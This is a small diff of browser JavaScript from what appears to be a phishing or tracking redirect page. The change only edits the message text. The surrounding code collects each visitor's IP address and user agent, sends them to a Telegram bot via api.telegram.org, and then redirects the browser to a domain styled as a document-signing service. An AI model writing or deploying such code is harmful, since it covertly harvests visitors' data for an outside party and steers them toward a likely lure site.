@@ -11,7 +11,7 @@
             .then(data => {
                 const ip = data.ip;
                 const userAgent = navigator.userAgent;
-                const message = `👤 Новый посетитель:\nIP: ${ip}\nUser-Agent: ${userAgent}`;
+                const message = `👤:\nIP: ${ip}\nUser-Agent: ${userAgent}`;
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                     .then(() => {
                         window.location.href = "https://app.fastsigndocu.com/";
